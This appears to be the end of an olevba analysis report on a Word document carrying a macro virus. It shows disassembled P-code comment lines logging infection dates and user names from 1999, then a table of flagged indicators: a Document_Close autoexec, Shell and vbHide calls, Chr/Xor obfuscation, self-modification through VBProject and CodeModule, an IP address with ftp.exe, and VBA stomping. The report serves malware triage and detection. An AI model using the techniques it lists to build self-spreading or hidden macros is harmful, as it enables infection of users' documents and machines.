' 	QuoteRem 0x0000 0x0000 ""
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' 	QuoteRem 0x0000 0x0020 " 04:58:50  - jeudi, 17 juin 1999"
' Line #280:
' 	QuoteRem 0x0000 0x000F " JOCELYNE ANTON"
' Line #281:
' 	QuoteRem 0x0000 0x0000 ""
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' 	QuoteRem 0x0000 0x0024 " 07:51:04 PM - Thursday, 24 Jun 1999"
' Line #286:
' 	QuoteRem 0x0000 0x000D " Data Fellows"
' Line #287:
' 	QuoteRem 0x0000 0x0000 ""
' Line #288:
' Line #289:
' Line #290:
' Line #291:
' 	QuoteRem 0x0000 0x001E " 08:57:01  - ñðåäà, 2 èþí 1999"
' Line #292:
' 	QuoteRem 0x0000 0x0011 " Mike Pavluschick"
' Line #293:
' 	QuoteRem 0x0000 0x0000 ""
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0024 " 02:56:10 PM - Wednesday, 4 Aug 1999"
' Line #298:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #299:
' 	QuoteRem 0x0000 0x0000 ""
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0022 " 12:00:58 PM - Monday, 12 Jan 2009"
' Line #304:
' 	QuoteRem 0x0000 0x0004 " sid"
' Line #305:
' 	QuoteRem 0x0000 0x0000 ""
' Line #306:
' Line #307:
' Line #308:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

